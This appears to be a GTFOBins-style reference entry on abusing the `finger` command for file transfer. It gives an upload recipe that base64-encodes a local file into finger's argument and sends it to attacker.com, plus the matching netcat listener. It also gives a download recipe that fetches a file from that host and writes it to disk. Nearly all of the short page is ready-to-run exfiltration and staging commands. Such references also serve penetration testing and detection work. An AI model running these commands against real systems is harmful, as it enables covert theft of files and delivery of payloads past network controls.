# GTFOBin: finger

`finger` hangs waiting for the remote peer to close the socket.

## File upload

It can exfiltrate files on the network.

Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.

```
RHOST=attacker.com
LFILE=file_to_send
finger "$(base64 $LFILE)@$RHOST"
```

## File download

It can download remote files.

Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | sudo nc -l -p 79` on the attacker box to send the file.

```
RHOST=attacker.com
LFILE=file_to_save
finger x@$RHOST | base64 -d > "$LFILE"
```